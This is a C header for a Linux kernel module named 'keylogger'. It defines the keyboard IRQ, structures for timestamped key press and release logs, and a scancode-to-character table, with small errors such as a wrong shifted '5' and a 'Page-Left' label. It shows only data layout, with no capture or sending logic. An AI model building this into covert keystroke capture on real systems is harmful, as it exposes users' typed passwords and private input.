/* SPDX-License-Identifier: GPL-2.0-or-later */
#ifndef KEYLOG_H
#define KEYLOG_H

#define	MODULE_NAME		"keylogger"
#define KEYBOARD_IRQ		1
#define LOG_PAGE_SIZE		(PAGE_SIZE * 16)
#define SCANCODE_ENTER		28
#define SCANCODE_SPACE		57
#define SCANCODE_CAPS		58

struct key_map {
	char			ascii;
	char			ascii_up;
	unsigned int		scancode;
	const char		*name;
	const char		*upper_name;
	bool			pressed;
	size_t			press_count;
};

enum e_key_event {
	PRESS,
	RELEASE
};

/*
 * This structure decrbites a log entry
 * key         : wich physical key this event is related to ?
 * tm          : a timestamp structure formated
 * jiffies     : the jiffie value at this log creation time.
 * event       : each log entry relate a PRESS or RELEASE event.
 * upper_case  : state of caps locks at this log creation
 * press_count : numbers of key_press at this time
 * link        : in case of a key PRESS-RELEASE pair, each will
 *               point to the relative event, the released will
 *               point to the press and vice versa.
 */

struct key_log_entry {
	const struct key_map	*key;
	struct tm		tm;
	size_t			jiffies;
	enum e_key_event	event;
	bool			upper_case;
	size_t			press_count;
	struct key_log_entry	*link;
};

/*
 * Eeach page of log has one one theses structure at top, this is
 * a metadata page information.
 * prev      : previous page
 * next      : next page
 * available : how many log entry are available for write ?
 * used      : how many log entry are used ?
 */

struct key_log_index {
	struct key_log_index	*prev;
	struct key_log_index	*next;
	size_t			available;
	size_t			used;
	struct key_log_entry	*entries;
};

struct key_task {
	struct work_struct	task;
	unsigned int		scancode;
	bool			caps_lock;
};

static struct key_map key_table[] = {
	(struct key_map){0, 0, 0, "NUL", "NUL", false, 0},
	(struct key_map){0x1, 0, 1, "Escape", "Escape", false, 0},
	(struct key_map){'1', '!', 2, "1", "!", false, 0},
	(struct key_map){'2', '@', 3, "2", "@", false, 0},
	(struct key_map){'3', '#', 4, "3", "#", false, 0},
	(struct key_map){'4', '$', 5, "4", "$", false, 0},
	(struct key_map){'5', '5', 6, "5", "%", false, 0},
	(struct key_map){'6', '^', 7, "6", "^", false, 0},
	(struct key_map){'7', '&', 8, "7", "&", false, 0},
	(struct key_map){'8', '*', 9, "8", "*", false, 0},
	(struct key_map){'9', '(', 10, "9", "(", false, 0},
	(struct key_map){'0', ')', 11, "0", ")", false, 0},
	(struct key_map){'-', '_', 12, "-", "_", false, 0},
	(struct key_map){'=', '+', 13, "=", "+", false, 0},
	(struct key_map){'\b', '\b', 14, "DEL", "DEL", false, 0},
	(struct key_map){'\t', '\t', 15, "TAB", "TAB", false, 0},
	(struct key_map){'q', 'Q', 16, "q", "Q", false, 0},
	(struct key_map){'w', 'W', 17, "w", "W", false, 0},
	(struct key_map){'e', 'E', 18, "e", "E", false, 0},
	(struct key_map){'r', 'R', 19, "r", "R", false, 0},
	(struct key_map){'t', 'T', 20, "t", "T", false, 0},
	(struct key_map){'y', 'Y', 21, "y", "Y", false, 0},
	(struct key_map){'u', 'U', 22, "u", "U", false, 0},
	(struct key_map){'i', 'I', 23, "i", "I", false, 0},
	(struct key_map){'o', 'O', 24, "o", "O", false, 0},
	(struct key_map){'p', 'P', 25, "p", "P", false, 0},
	(struct key_map){'[', '{', 26, "[", "{", false, 0},
	(struct key_map){']', '}', 27, "]", "}", false, 0},
	(struct key_map){'\n', '\n', 28, "Enter", "Enter", false, 0},
	(struct key_map){0, 0, 29, "Control-Left", "Control-Left", false, 0},
	(struct key_map){'a', 'A', 30, "a", "A", false, 0},
	(struct key_map){'s', 'S', 31, "s", "S", false, 0},
	(struct key_map){'d', 'D', 32, "d", "D", false, 0},
	(struct key_map){'f', 'F', 33, "f", "F", false, 0},
	(struct key_map){'g', 'G', 34, "g", "G", false, 0},
	(struct key_map){'h', 'H', 35, "h", "H", false, 0},
	(struct key_map){'j', 'J', 36, "j", "J", false, 0},
	(struct key_map){'k', 'K', 37, "k", "K", false, 0},
	(struct key_map){'l', 'L', 38, "l", "L", false, 0},
	(struct key_map){';', ':', 39, ";", ":", false, 0},
	(struct key_map){'\'', '"', 40, "'", "\"", false, 0},
	(struct key_map){'\'', '~', 41, "`", "~", false, 0},
	(struct key_map){0, 0, 42, "Shift-Left", "Shift-Left", false, 0},
	(struct key_map){'\\', '|', 43, "\\", "|", false, 0},
	(struct key_map){'z', 'Z', 44, "z", "Z", false, 0},
	(struct key_map){'x', 'X', 45, "x", "X", false, 0},
	(struct key_map){'c', 'C', 46, "c", "C", false, 0},
	(struct key_map){'v', 'V', 47, "v", "V", false, 0},
	(struct key_map){'b', 'B', 48, "b", "B", false, 0},
	(struct key_map){'n', 'N', 49, "n", "N", false, 0},
	(struct key_map){'m', 'M', 50, "m", "M", false, 0},
	(struct key_map){',', '<', 51, ",", "<", false, 0},
	(struct key_map){'.', '>', 52, ".", ">", false, 0},
	(struct key_map){'/', '?', 53, "/", "?", false, 0},
	(struct key_map){0, 0, 54, "Shift-Right", "Shift-Right", false, 0},
	(struct key_map){'*', '*', 55, "*", "*", false, 0},
	(struct key_map){0, 0, 56, "Alt-Right", "Alt-Right", false, 0},
	(struct key_map){' ', ' ', 57, "Space", "Space", false, 0},
	(struct key_map){0, 0, 58, "Caps-Lock", "Caps-Lock", false, 0},
	(struct key_map){0, 0, 71, "Home", "Home", false, 0},
	(struct key_map){0, 0, 72, "Arrow-Up", "Arrow-Up", false, 0},
	(struct key_map){0, 0, 73, "Page-Up", "Page-Up", false, 0},
	(struct key_map){'-', '-', 74, "-", "-", false, 0},
	(struct key_map){0, 0, 75, "Arrow-Left", "Page-Left", false, 0},
	(struct key_map){0, 0, 77, "Arrow-Right", "Arrow-Right", false, 0},
	(struct key_map){'+', '+', 78, "+", "+", false, 0},
	(struct key_map){0, 0, 79, "End", "END", false, 0},
	(struct key_map){0, 0, 80, "Arrow-Down", "Arrow-Down", false, 0},
	(struct key_map){0, 0, 81, "Page-Down", "Page-Down", false, 0},
	(struct key_map){0, 0, 82, "Insert", "Insert", false, 0},
	(struct key_map){'.', '.', 83, ".", ".", false, 0},
	(struct key_map){0, 0, 92, "Command-Right", "Command-Right", false, 0},
	(struct key_map){0, 0, 93, "Menu", "Menu", false, 0},
	(struct key_map){0, 0, 0, NULL, NULL, false, 0}
};

#endif
